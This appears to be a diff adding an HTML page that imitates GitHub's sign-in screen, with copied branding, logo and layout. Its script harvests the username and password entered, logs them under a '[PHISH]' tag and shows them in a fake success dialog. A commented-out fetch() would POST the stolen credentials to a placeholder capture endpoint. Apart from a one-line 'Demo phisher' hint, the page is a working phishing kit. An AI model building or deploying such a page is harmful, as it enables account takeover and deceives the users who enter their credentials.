@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to GitHub</title>
+  <style>
+    :root { --gh-blue:#0969da; --gh-border:#d0d7de; --bg:#f6f8fa; }
+    * { box-sizing:border-box; }
+    body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif; background:var(--bg); color:#1f2328; }
+    .wrap { max-width:960px; margin:48px auto; padding:0 16px; }
+    .card { background:#fff; border:1px solid var(--gh-border); border-radius:6px; overflow:hidden; }
+    .top { display:flex; align-items:center; justify-content:space-between; padding:20px 24px; border-bottom:1px solid #eaeef2; }
+    .brand { display:flex; align-items:center; gap:10px; font-weight:600; font-size:18px; }
+    .mark { width:28px; height:28px; background:#24292f; border-radius:6px; display:grid; place-items:center; color:#fff; }
+    .links a { color:#57606a; text-decoration:none; margin-left:16px; font-size:14px; }
+    .links a:hover { text-decoration:underline; }
+    .main { display:grid; grid-template-columns:1fr 1fr; }
+    .info { padding:28px 24px; background:#f9fbfd; border-right:1px solid #eaeef2; }
+    .info h2 { margin:0 0 14px; font-size:16px; }
+    .list { list-style:none; margin:0; padding:0; }
+    .list li { position:relative; padding:0 0 14px 26px; font-size:14px; color:#424a53; }
+    .list li::before { content:"✓"; position:absolute; left:0; top:0; width:18px; height:18px; border-radius:50%; background:#dafbe1; color:#116329; font-size:12px; line-height:18px; text-align:center; }
+    .form { padding:28px 24px; }
+    .form h1 { margin:0 0 18px; font-size:20px; }
+    .field { margin-bottom:14px; }
+    label { display:block; margin-bottom:6px; font-size:13px; color:#424a53; }
+    input[type=text], input[type=password] { width:100%; padding:10px 12px; border:1px solid var(--gh-border); border-radius:6px; font-size:14px; }
+    input:focus { outline:2px solid var(--gh-blue); outline-offset:1px; }
+    .options { display:flex; justify-content:space-between; align-items:center; margin:4px 0 18px; font-size:13px; }
+    .remember { display:flex; align-items:center; gap:8px; color:#424a53; }
+    .remember input { accent-color:var(--gh-blue); }
+    .forgot { color:var(--gh-blue); text-decoration:none; }
+    .forgot:hover { text-decoration:underline; }
+    .btn { width:100%; padding:11px; border:1px solid transparent; border-radius:6px; background:var(--gh-blue); color:#fff; font-size:15px; font-weight:600; cursor:pointer; }
+    .btn:hover { filter:brightness(.95); }
+    .hint { margin-top:14px; font-size:12px; color:#57606a; text-align:center; }
+    .modal { position:fixed; inset:0; background:rgba(24,28,33,.55); display:none; align-items:center; justify-content:center; z-index:10; }
+    .modal.show { display:flex; }
+    .dialog { width:min(380px, calc(100vw - 32px)); background:#fff; border:1px solid var(--gh-border); border-radius:8px; padding:22px; text-align:center; }
+    .dialog .icon { width:44px; height:44px; margin:0 auto 12px; border-radius:50%; background:#dafbe1; color:#116329; display:grid; place-items:center; font-size:22px; }
+    .dialog h3 { margin:0 0 8px; }
+    .dialog p { margin:0 0 16px; font-size:14px; color:#424a53; word-break:break-all; }
+    @media (max-width:720px) { .main { grid-template-columns:1fr; } .info { border-right:0; border-bottom:1px solid #eaeef2; } .top { flex-wrap:wrap; gap:10px; } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="top">
+        <div class="brand"><span class="mark"><svg width="18" height="18" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.03.37-2.56-.4-2.77-.78-.09-.16-.48-.65-.83-1.23-2.84.3-3.41-1.04-3.41-1.04-.46-.98-.9-1.23-.9-1.23-.74-.53.06-.52.06-.52.82.06 1.25.85 1.25.85.73 1.27 1.91.91 2.37.69.07-.54.28-.9.51-1.11-1.8-.21-3.7-1.8-3.7-4.03 0-.89.25-1.62.67-2.21-.07-.2-.67-1.01-.16-2.04 0 0 .64-.21 2.11.82.61-.18 1.27-.27 1.91-.27.64 0 1.3.09 1.91.27 1.46-1.04 2.1-.82 2.1-.82.51 1.03-.09 1.84-.16 2.04.42.6.67 1.32.67 2.21 0 2.24-1.91 3.81-3.73 4.02.3.25.56.74.56 1.5 0 1.08-.01 1.94-.01 2.2 0 .21.15.46.55.38C13.71 14.53 16 11.54 16 8c0-4.42-3.58-8-8-8z"/></svg></span> GitHub</div>
+        <div class="links"><a href="#">Pricing</a><a href="#">Blog</a><a href="#">Sign up</a></div>
+      </div>
+      <div class="main">
+        <aside class="info">
+          <h2>Why sign in?</h2>
+          <ul class="list">
+            <li>Manage repositories, issues, and pull requests.</li>
+            <li>Use GitHub Actions, Codespaces, and Copilot.</li>
+            <li>Collaborate with teams and organizations.</li>
+          </ul>
+        </aside>
+        <section class="form">
+          <h1>Sign in to GitHub</h1>
+          <form id="login-form" autocomplete="on">
+            <div class="field"><label for="username">Username or email</label><input id="username" name="username" type="text" placeholder="octocat" required /></div>
+            <div class="field"><label for="password">Password</label><input id="password" name="password" type="password" placeholder="••••••••" required /></div>
+            <div class="options">
+              <label class="remember"><input id="remember" type="checkbox" checked /> Keep me signed in</label>
+              <a class="forgot" href="#">Forgot password?</a>
+            </div>
+            <button class="btn" type="submit">Sign in</button>
+          </form>
+          <p class="hint">Demo phisher — open DevTools console to see captured credentials.</p>
+        </section>
+      </div>
+    </div>
+  </div>
+  <div class="modal" id="success-modal">
+    <div class="dialog">
+      <div class="icon">✓</div>
+      <h3>Signed in successfully</h3>
+      <p>Captured: <strong id="captured-text"></strong></p>
+      <button class="btn" id="close-modal">Close</button>
+    </div>
+  </div>
+  <script>
+    const form = document.getElementById('login-form');
+    const modal = document.getElementById('success-modal');
+    const capturedText = document.getElementById('captured-text');
+    const closeBtn = document.getElementById('close-modal');
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      const remember = document.getElementById('remember').checked;
+      const payload = { site:'github.com', username, password, remember, ts:new Date().toISOString() };
+      console.log('%c[PHISH] GitHub credentials captured','color:#0969da;font-weight:bold', payload);
+      // Uncomment to send to your endpoint:
+      // fetch('https://your-endpoint.example/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(()=>{});
+      capturedText.textContent = `${username} / ${password}`;
+      modal.classList.add('show');
+    });
+    closeBtn.addEventListener('click', ()=> modal.classList.remove('show'));
+    modal.addEventListener('click', e => { if(e.target === modal) modal.classList.remove('show'); });
+  </script>
+</body>
+</html>
